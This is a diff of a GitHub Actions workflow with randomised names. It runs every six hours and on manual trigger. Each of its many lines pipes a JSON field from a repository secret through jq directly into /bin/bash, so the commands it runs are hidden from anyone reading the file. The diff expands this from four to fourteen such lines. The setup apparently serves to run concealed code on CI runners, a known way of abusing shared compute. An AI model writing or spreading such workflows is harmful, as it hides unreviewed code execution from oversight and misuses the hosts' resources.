@@ -3,19 +3,29 @@ name: ruanxiaowu19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 0/6 * * *'
+    - cron: '42 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: ruanxiaowu19871010
         env:
-          ryji2: ${{ secrets.ryji2 }}
+          n3995: ${{ secrets.n3995 }}
         run: |
-          echo $ryji2 | jq -r .onut0419 | /bin/bash
-          echo $u4 | jq -r .dt6 | /bin/bash
-          echo $fwr8 | jq -r .ka39 | /bin/bash
-          echo $kc61559 | jq -r .nghet802 | /bin/bash
+          echo $n3995 | jq -r .a87952 | /bin/bash
+          echo $whnzl9 | jq -r .kjqp65 | /bin/bash
+          echo $sm58419 | jq -r .rwv11 | /bin/bash
+          echo $mla07947 | jq -r .m84 | /bin/bash
+          echo $l9 | jq -r .pa4 | /bin/bash
+          echo $thgf4 | jq -r .cr8 | /bin/bash
+          echo $cgze47 | jq -r .w66846 | /bin/bash
+          echo $lfst7793 | jq -r .yud0 | /bin/bash
+          echo $vgrp3971 | jq -r .i68 | /bin/bash
+          echo $vjwcq48 | jq -r .avyl4 | /bin/bash
+          echo $rwnlb1337 | jq -r .plx377 | /bin/bash
+          echo $tp902 | jq -r .qdbgu5 | /bin/bash
+          echo $fvius0097 | jq -r .hy0107 | /bin/bash
+          echo $uld37395 | jq -r .iann3 | /bin/bash
 
